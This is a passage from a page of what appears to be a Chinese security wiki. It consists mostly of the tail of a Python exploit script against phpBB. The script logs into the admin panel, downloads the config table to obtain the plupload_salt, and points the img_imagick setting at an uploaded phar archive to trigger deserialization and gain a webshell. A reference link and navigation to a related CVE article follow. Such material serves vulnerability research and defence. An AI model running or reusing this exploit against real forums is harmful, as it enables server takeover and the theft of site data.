    <span class="n">credential</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="n">attrs</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;credential&#39;</span><span class="p">})</span>
    <span class="n">credential</span> <span class="o">=</span> <span class="n">credential</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">]</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">admin_account</span><span class="p">,</span>
        <span class="n">passwd_id</span><span class="p">:</span> <span class="n">admin_pwd</span><span class="p">,</span>
        <span class="s1">&#39;login&#39;</span><span class="p">:</span> <span class="s1">&#39;Login&#39;</span><span class="p">,</span>
        <span class="s1">&#39;redirect&#39;</span><span class="p">:</span> <span class="s1">&#39;./../adm/index.php&#39;</span><span class="p">,</span>
        <span class="s1">&#39;credential&#39;</span><span class="p">:</span> <span class="n">credential</span>
    <span class="p">}</span>
    <span class="n">rs</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;/adm/index.php?sid=&#39;</span> <span class="o">+</span> <span class="n">sid</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="n">html</span> <span class="o">=</span> <span class="n">rs</span><span class="o">.</span><span class="n">text</span>
    <span class="k">if</span> <span class="s1">&#39;&lt;title&gt;ACP index&lt;/title&gt;&#39;</span> <span class="ow">in</span> <span class="n">html</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Administration Control Panel login successful&#39;</span><span class="p">)</span>

    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">html</span><span class="p">,</span> <span class="s2">&quot;html.parser&quot;</span><span class="p">)</span>
    <span class="n">div</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;div&#39;</span><span class="p">,</span> <span class="n">attrs</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span> <span class="s1">&#39;page-header&#39;</span><span class="p">})</span>
    <span class="n">sid</span> <span class="o">=</span> <span class="n">div</span><span class="o">.</span><span class="n">a</span><span class="p">[</span><span class="s1">&#39;href&#39;</span><span class="p">][</span><span class="o">-</span><span class="mi">32</span><span class="p">:]</span>

    <span class="n">rs</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;/adm/index.php?i=acp_database&amp;mode=backup&amp;sid=&#39;</span> <span class="o">+</span> <span class="n">sid</span><span class="p">)</span>
    <span class="n">html</span> <span class="o">=</span> <span class="n">rs</span><span class="o">.</span><span class="n">text</span>
    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">html</span><span class="p">,</span> <span class="s2">&quot;html.parser&quot;</span><span class="p">)</span>
    <span class="nb">input</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="n">attrs</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;form_token&#39;</span><span class="p">})</span>
    <span class="n">form_token</span> <span class="o">=</span> <span class="nb">input</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">]</span>
    <span class="nb">input</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="n">attrs</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;creation_time&#39;</span><span class="p">})</span>
    <span class="n">creation_time</span> <span class="o">=</span> <span class="nb">input</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">]</span>

    <span class="n">data</span> <span class="o">=</span> <span class="s2">&quot;type=data&amp;method=text&amp;where=download&amp;table%5B%5D=phpbb_config&amp;submit=Submit&amp;creation_time=</span><span class="si">{creation_time}</span><span class="s2">&amp;form_token=</span><span class="si">{form_token}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
        <span class="n">creation_time</span><span class="o">=</span><span class="n">creation_time</span><span class="p">,</span> <span class="n">form_token</span><span class="o">=</span><span class="n">form_token</span><span class="p">)</span>
    <span class="n">rs</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;/adm/index.php?i=acp_database&amp;mode=backup&amp;action=download&amp;sid=&#39;</span> <span class="o">+</span> <span class="n">sid</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span>
                <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">,</span> <span class="s2">&quot;Connection&quot;</span><span class="p">:</span> <span class="s2">&quot;close&quot;</span><span class="p">,</span>
                         <span class="s2">&quot;Accept&quot;</span><span class="p">:</span> <span class="s2">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;</span><span class="p">})</span>
    <span class="n">html</span> <span class="o">=</span> <span class="n">rs</span><span class="o">.</span><span class="n">text</span>
    <span class="k">if</span> <span class="s1">&#39;phpBB Backup Script&#39;</span> <span class="ow">in</span> <span class="n">html</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Database download succeeded&#39;</span><span class="p">)</span>
        <span class="n">matchObj</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;\(&#39;plupload_salt&#39;, &#39;(.*?)&#39;, 0\)&quot;</span><span class="p">,</span> <span class="n">html</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">M</span> <span class="o">|</span> <span class="n">re</span><span class="o">.</span><span class="n">I</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">matchObj</span><span class="p">:</span>
            <span class="n">plupload_salt</span> <span class="o">=</span> <span class="n">matchObj</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Get the plupload_salt successfully ：</span><span class="si">{plupload_salt}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">plupload_salt</span><span class="o">=</span><span class="n">plupload_salt</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">exit</span><span class="p">(</span><span class="s1">&#39;Get the plupload_salt failed&#39;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">exit</span><span class="p">(</span><span class="s1">&#39;Database download failed&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Calculate the name of the phar&#39;</span><span class="p">)</span>

    <span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">{plupload_salt}</span><span class="s2">_</span><span class="si">{md5name}</span><span class="s2">zip.part&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">plupload_salt</span><span class="o">=</span><span class="n">plupload_salt</span><span class="p">,</span> <span class="n">md5name</span><span class="o">=</span><span class="n">md5</span><span class="p">(</span><span class="n">upfilename</span><span class="p">))</span>

    <span class="n">rs</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;/adm/index.php?i=acp_attachmenpartts&amp;mode=attach&amp;sid=&#39;</span> <span class="o">+</span> <span class="n">sid</span><span class="p">)</span>
    <span class="n">html</span> <span class="o">=</span> <span class="n">rs</span><span class="o">.</span><span class="n">text</span>
    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">html</span><span class="p">,</span> <span class="s2">&quot;html.parser&quot;</span><span class="p">)</span>
    <span class="nb">input</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="n">attrs</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;form_token&#39;</span><span class="p">})</span>
    <span class="n">form_token</span> <span class="o">=</span> <span class="nb">input</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">]</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Get form_token from Attachment settings：</span><span class="si">{form_token}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">form_token</span><span class="o">=</span><span class="n">form_token</span><span class="p">))</span>

    <span class="n">data</span> <span class="o">=</span> <span class="s2">&quot;config%5Ballow_attachments%5D=1&amp;config%5Ballow_pm_attach%5D=0&amp;config%5Bupload_path%5D=files&amp;config%5Bdisplay_order%5D=0&amp;config%5Battachment_quota%5D=50&amp;attachment_quota=mb&amp;config%5Bmax_filesize%5D=256&amp;max_filesize=kb&amp;config%5Bmax_filesize_pm%5D=256&amp;max_filesize_pm=kb&amp;config%5Bmax_attachments%5D=3&amp;config%5Bmax_attachments_pm%5D=1&amp;config%5Bsecure_downloads%5D=0&amp;config%5Bsecure_allow_deny%5D=1&amp;config%5Bsecure_allow_empty_referer%5D=1&amp;config%5Bcheck_attachment_content%5D=1&amp;config%5Bimg_display_inlined%5D=1&amp;config%5Bimg_create_thumbnail%5D=0&amp;config%5Bimg_max_thumb_width%5D=400&amp;config%5Bimg_min_thumb_filesize%5D=12000&amp;config%5Bimg_imagick%5D=</span><span class="si">{upfile}</span><span class="s2">&amp;config%5Bimg_max_width%5D=0&amp;config%5Bimg_max_height%5D=0&amp;config%5Bimg_link_width%5D=0&amp;config%5Bimg_link_height%5D=0&amp;submit=Submit&amp;ips=&amp;ipexclude=0&amp;creation_time=1552465991&amp;form_token=</span><span class="si">{form_token}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
        <span class="n">form_token</span><span class="o">=</span><span class="n">form_token</span><span class="p">,</span>
        <span class="n">upfile</span><span class="o">=</span><span class="s1">&#39;phar://../files/plupload/&#39;</span> <span class="o">+</span> <span class="n">name</span><span class="p">)</span>
    <span class="n">rs</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;/adm/index.php?i=acp_attachments&amp;mode=attach&amp;sid=&#39;</span> <span class="o">+</span> <span class="n">sid</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Get webshell succeeded&#39;</span><span class="p">)</span>
</code></pre></div>

<h2 id="_8">参考链接<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://xz.aliyun.com/t/8239">https://xz.aliyun.com/t/8239</a>#toc-3</p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2019-13376%EF%BC%89PhpBB%E4%BB%8Esession%20id%E6%B3%84%E9%9C%B2%E5%88%B0CSRF%E5%88%B0XSS/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2019-13376%EF%BC%89PhpBB%E4%BB%8Esession%20id%E6%B3%84%E9%9C%B2%E5%88%B0CSRF%E5%88%B0XSS/" class="btn btn-xs btn-link">
        （CVE-2019-13376）PhpBB从session id泄露到CSRF到XSS
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Php/xdebug-rce/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Php/xdebug-rce/README.zh-cn/" class="btn btn-xs btn-link">
        PHP XDebug远程调试导致代码执行漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>